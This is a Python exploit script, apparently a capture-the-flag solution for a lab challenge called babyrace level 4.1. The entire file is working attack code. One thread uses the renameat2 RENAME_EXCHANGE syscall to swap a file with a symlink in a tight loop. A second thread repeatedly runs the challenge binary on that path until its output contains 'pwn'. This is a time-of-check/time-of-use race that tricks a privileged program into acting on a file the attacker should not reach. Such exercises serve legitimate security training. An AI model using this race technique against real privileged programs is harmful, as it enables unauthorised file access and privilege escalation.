#!/usr/bin/env python3
import subprocess
import threading
import time
from multiprocessing import Process, cpu_count
import ctypes,os
libc = ctypes.CDLL("libc.so.6", use_errno=True)
path = '/home/hacker'
TARGET=path +'/f'
SYMLINK=path+'/lk'
CHALLENGE='/challenge/babyrace_level4.1'

SYS_renameat2 = 316     # x86_64
AT_FDCWD = -100
RENAME_EXCHANGE = 2

def xchg(path_a: str, path_b: str):
    rc = libc.syscall(
        SYS_renameat2,
        AT_FDCWD, path_a.encode(),
        AT_FDCWD, path_b.encode(),
        RENAME_EXCHANGE
    )
    if rc != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
def flipper():
    while True:
        try:
            xchg(TARGET,SYMLINK)
        except:
            continue
def runner():
    while True:
        try:
            out = subprocess.check_output(
                [CHALLENGE, TARGET], 
                stderr=subprocess.STDOUT
            )
            print(out)
            if b'pwn' in out:
                print(out.decode())
                os._exit(0)
        except subprocess.CalledProcessError as e:
            print(e)
            continue

thread1=threading.Thread(target=flipper,daemon=True)
thread1.priority=9
thread2=threading.Thread(target=runner,daemon=False)
thread2.priority=7
thread1.start()
thread2.start()
